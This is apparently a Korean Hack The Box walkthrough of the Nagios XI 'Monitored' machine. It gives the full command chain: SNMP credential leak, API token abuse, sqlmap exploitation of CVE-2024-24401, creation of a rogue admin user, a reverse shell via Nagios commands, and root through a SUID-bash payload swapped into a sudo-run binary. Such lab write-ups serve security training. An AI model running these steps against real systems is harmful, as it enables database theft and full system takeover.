# HTB-MONITORED
```bash
OS: Linux
DATE: 26.10.13
DIFFICULTY: Medium
```

## RECON
**nmap**: 열거를 위해 포트 검사를 진행하였다. 먼저 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80,389,443,5667 | tee TCP_NMAP
```
```bash
sudo nmap -sUV --top-ports 100 | tee UDP_NMAP
```
포트 검사 결과 TCP HTTP, LDAP, HTTPS 서비스가 돌아가고 있었다. UDP 123, 161 NTP, SNMP 서비스가 운영 중인 것을 알게 되었다. 따라서 먼저 HTTP에 접속하였다. 접속한 결과 HTTPS로 리다이렉트되면서 `nagios.monitored.htb`라는 도메인으로 리다이렉션이 되었다. 대상 시스템은 **Nagios XI** 서비스가 운영 중이었다. 일단 지금 당장 알 수 있는 정보가 없어 389 포트 접속을 시도하였다. anonymous 계정으로 ldap 정보를 출력해보았다
```bash
ldapsearch -x -H ldap://IP -b "DC=monitored,DC=htb"

# extended LDIF
#
# LDAPv3
# base <DC=monitored,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# monitored.htb
dn: dc=monitored,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: monitored.htb
dc: monitored

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
ldap 정보에서도 알 수가 없었다. 따라서 UDP 포트 161 SNMP 서비스 내용을 출력해보았다
```bash
snmp-check IP

1409                  runnable              sudo                  sudo                  -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
1410                  runnable              bash                  /bin/bash             -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
1484                  runnable              exim4                 /usr/sbin/exim4       -bd -q30m           
```
확인 결과 **svc**라는 유저의 크레덴셜처럼 보이는 것을 찾을 수 있었다

## Initial Access
svc 유저의 크레덴셜을 https 서비스, 즉 **Nagios XI** 서비스의 로그인 창에서 시도해보았다. 하지만 불가능하여 SSH도 시도하였지만 불가능하였다. 따라서 default credential을 찾아 시도한 결과 또한 실패하였다. 하지만 svc 유저의 계정을 시도했을 때와 admin 같은 계정을 시도하여 실패했을 때 오류 문구가 달랐다. svc 계정은 `The specified user account has been disabled or does not exist.`라고 오류 문구가 떴다. 따라서 실제 서비스에 있는 계정이긴 하나 로그인만 불가능한 것 같았다. 따라서 웹폼에서는 막혔지만 제약이 많이 없는 API 경로를 찾아보았다. 먼저 Nagios XI의 API 폼을 검색해보았다. 일단 주소가 `/nagiosxi/api/v1`부터 시작한다는 것을 알게 되었다. 이후 api를 찾기 위해 fuzzing을 진행하였다
```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -c -r 
```
FUZZING 결과 **authenticate**라는 경로를 찾게 되었다. 따라서 대상 경로를 버프스위트로 가지고 와서 전송한 결과 POST method만 가능하여 POST로 변경 후 실행하였다. 실행 결과
```js
{"error":"Must be valid username and password."}
```
따라서 username과 password 파라미터를 넣어준 후 실행하였지만 불가능하였다. 알고 보니 POST method는 Content-Type을 추가해주어야 했다. 따라서 추가해준 후 svc 크레덴셜을 넣어 실행하였다
```bash
POST /nagiosxi/api/v1/authenticate HTTP/1.1
Host: nagios.monitored.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=svc&password=XjH7VCehowpR1xZB
```
그 결과 auth_token이라는 token을 얻을 수 있었다
```js 
{"username":"svc","user_id":"2","auth_token":"934d12cdd9344abd6319f73ce931b552b0a7521e","valid_min":5,"valid_until":"Wed, 14 Oct 2026 23:54:26 -0400"}
```
token을 얻게 된 후 `NagiosXI vulnerabilities auth_token`라고 검색한 결과 CVE-2024-24401의 SQLI 취약점이 있다는 것을 알게 되었다. 따라서 확인해본 결과 `/nagiosxi/admin/banner_message-ajaxhelper.php`라는 엔드포인트에 id 파라미터가 취약하다는 것을 알게 되었다. 인증된 유저여야 접근이 가능하고, 따라서 아까 받은 토큰을 **?token=(the token)** 파라미터 형식으로 인증을 할 수가 있었다
```html
/nagiosxi/admin/banner_message-ajaxhelper.php?token=(the token)
```
이것을 알게 된 후 더 찾아본 결과 `action=acknowledge banner message&id=3`라는 파라미터가 취약한 것을 알게 되었다. 따라서 바로 확인한 결과 id=3에다가 `'`을 추가해주면 sqli가 통한다는 것을 알 수 있었다. 그리고 아까 가진 토큰을 통해 접속하여 쿠키를 얻어준 후 바로 sqlmap을 돌려주었다
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=bspu3ilq508jivkicfqofjo29g" --batch --threads 1

[*] information_schema                                         
[*] nagiosxi  
```
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=j1vh3c40bhl00eelt8qqiru7ob" --batch --threads 10 -D nagiosxi --tables

[22 tables]                                                    
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=j1vh3c40bhl00eelt8qqiru7ob" --batch --threads 10 -D nagiosxi -T xi_users --dump 
```
dump를 한 결과 admin의 api 키를 얻을 수 있었다. Nagios XI는 API 키로 많은 것을 할 수 있다. 먼저 /system 엔드포인트에 접속해보았다. 하지만 볼 수 있는 것이 없어 더 찾아본 결과 `/system/user` 엔드포인트를 찾을 수 있었다.
찾아본 결과 대상 엔드포인트는 알맞은 파라미터를 입력하고 서버에 전송을 하면 유저를 만들 수 있는 엔드포인트였다. 따라서 조건 파라미터를 추가해준 후 burpsuite를 통해 어드민 권한 유저를 만들 수 있었다
```bash
username=seon&password=seon&name=admin&email=admin@monitored.htb&auth_level=admin&force_pw_change:0
```
이로써 seon이라는 유저명으로 사이트에 접속한 결과 접속이 성공적으로 이루어졌다

![seon](attach_real/Pasted%20image%2020261015141048.png)

이제 웹사이트에서 쉘을 얻기 위해 돌아보던 중 admin 페이지 안에 advanced config라는 페이지가 있었다. 안을 들여다보니 **command**라는 기능이 있었다. 대상 기능은 쉘에서 실행하는 것 같았다. 따라서 `Add New` 버튼을 눌러주고 리버스 쉘을 작성하여 업로드하였다. 하지만 어디서 실행하는지 몰라 계속 찾던 중 `localhost` 안에 **check command**라는 기능이 있었다. 안에서 저장했던 파일을 이름으로 넣어주고 run 버튼을 누른 결과 쉘을 얻을 수 있었다

![user](attach_real/Pasted%20image%2020261015102734.png)

## Privilege Escalation
쉘을 얻은 후 권한 상승 경로를 찾던 중 `sudo -l`을 시도하여 NOPASSWD 기능을 확인해본 결과
```bash
User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
이렇게 많은 결과를 얻을 수 있었다. 따라서 관련 내용들을 모두 구글에 검색해본 결과 아무것도 발견할 수 없었다. 따라서 NOPASSWD 스크립트를 모두 읽어보았다. 먼저 `manage_services.sh` 스크립트를 확인해본 결과 내부에서 인자를 받아 /etc/init.d/nagios를 실행한다는 것을 알게 되었다
```bash
BASEDIR=$(dirname $(readlink -f $0))

# Import xi-sys.cfg config vars
. $BASEDIR/../etc/xi-sys.cfg

# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")

# Helper functions
# -----------------------

contains () {
    local array="$1[@]"
    local seeking=$2
    local in=1
    for element in "${!array}"; do
        if [[ "$element" == "$seeking" ]]; then
            in=0
            break
        fi
    done
    return $in
}

# Verify to avoid abuse
# -----------------------

# Check to verify the proper usage format
# ($1 = action, $2 = service name)

if ! contains first "$1"; then
    echo "First parameter must be one of: ${first[*]}"
    exit 1
fi

if ! contains second "$2"; then
    echo "Second parameter must be one of: ${second[*]}"
    exit 1
fi

action=$1

# if service name is defined in xi-sys.cfg use that name
# else use name passed
if [ "$2" != "php-fpm" ] && [ ! -z "${!2}" ];then
    service=${!2}
else
    service=$2
fi

# if the action is status, add -n 0 to args to stop journal output
# on CentOS/RHEL 7 systems
args=""
if [ "$action" == "status" ]; then
    args="-n 0"
fi

# Special case for ndo2db since we don't use it anymore
if [ "$service" == "ndo2db" ]; then
    echo "OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service"
    exit 0
fi

# Run the command
# -----------------------

# CentOS / Red Hat

if [ "$distro" == "CentOS" ] || [ "$distro" == "RedHatEnterpriseServer" ] || [ "$distro" == "EnterpriseEnterpriseServer" ] || [ "$distro" == "OracleServer" ]; then
    # Check for enable/disable verb
    if [ "$action" == "enable" ] || [ "$action" == "disable" ]; then
        if [ `command -v systemctl` ]; then
            `which systemctl` --no-pager "$action" "$service"
        elif [ `command -v chkconfig` ]; then
            chkconfig_path=`which chkconfig`
            if [ "$action" == "enable" ]; then
                "$chkconfig_path" --add "$service"
                return_code=$?
            elif [ "$action" == "disable" ]; then
                "$chkconfig_path" --del "$service"
                return_code=$?
            fi
        fi

        exit $return_code
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
        if [ "$service" == "mysqld" ] && [ $return_code -ne 0 ]; then
            service="mariadb"
            `which systemctl` "$action" "$service" $args
            return_code=$?
        fi
    elif [ ! `command -v service` ]; then
        "/etc/init.d/$service" "$action"
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# OpenSUSE / SUSE Enterprise

if [ "$distro" == "SUSE LINUX" ]; then
    if [ "$dist" == "suse11" ]; then
        `which service` "$service" "$action"
        return_code=$?
    fi
fi


# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# Others?

exit $return_code
```
코드 확인 후 `/etc/init.d/nagios`를 확인한 결과 /usr/local/nagios/bin/nagios 바이너리를 실행하는 것을 알게 되었다. 그 안에서 바이너리를 root로 실행하는 것도 알게 되었다. 그 대상은 nagios 소유이기 때문에 쓰기가 가능했다. 결론적으로 root가 실행하는 파일을 내가 바꿀 수 있었다. 그것을 악성 스크립트로 교체 후 SUID bash 계획을 세웠다. 따라서 exploit을 진행하였다. 먼저 `/usr/local/nagios/bin/nagios` 바이너리를 mv로 백업해주었다
```bash
mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios.bk
```
이유는 루트가 nagios라는 정확한 이름을 실행하기에, 옮겨주고 nagios라는 새로운 악성 스크립트를 적어주는 것이다. 이후 페이로드를 작성해주었다
```bash
nano /tmp/sean.sh
```
```bash
#!/bin/bash
cp /bin/bash /tmp/sh
chown root:root /tmp/sh
chmod 4755 /tmp/sh
```
이후 만든 페이로드를 `/usr/local/nagios/bin/nagios` 위치로 복사해주었다
```bash
cp /tmp/sean.sh /usr/local/nagios/bin/nagios
```
이후 sudo를 이용하여 `/usr/local/nagiosxi/scripts/manage_services.sh`에 인자값을 적어 작동시켜주었다

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```
이후 /tmp/sh를 확인한 결과 suid가 붙은 것을 확인하였다. 따라서 root 쉘을 얻을 수 있었다
```bash
/tmp/sh -p
```

![root](attach_real/Pasted%20image%2020261015114625.png)

## New Inform
- 항상 오류 메시지를 확인하자
- 크레덴셜은 맞는데 접근이 불가능하다면 입구(웹폼) 등에서 안 받아줄 뿐이라고 생각하자. 웹 로그인 폼도 있을 수 있고 REST API가 될 수도 있다.
- 웹폼은 API랑 인증 처리 로직이 다를 수 있음. 웹폼은 2FA, 세션, 계정 잠금 등이 걸려 있을 수 있지만 API는 그런 제약 없이 raw하게 크레덴셜만 검사하는 경우가 많음
- api fuzzing을 진행할 때 api wordlist를 사용하지 말고 big.txt나 일반적인 리스트를 사용하자
- 항상 버프스위트를 이용하자
- POST method는 항상 파라미터가 필요하다
- 또한 POST method는 Content-Type header가 필요하다
- 무언가 얻고 막히면 대상 이름과 대상 시스템 취약점을 찾아본다
- 항상 CVE를 찾고 설명을 꼭 읽자
- 그냥 searching을 잘하면 뭐든 된다
- 항상 비번 없어도 sudo -l을 시도하자
- 권한 상승 할 때 관련 프로그램 취약점이 없으면 스크립트를 꼭 꼼꼼하게 읽자
- 항상 bash SUID 권한 상승 페이로드를 만들 때 chown을 꼭 추가해주자
- chown은 chmod보다 먼저 해야 한다. chmod +s로 SUID를 붙인 뒤에 chown을 하면 SUID 비트가 날아간다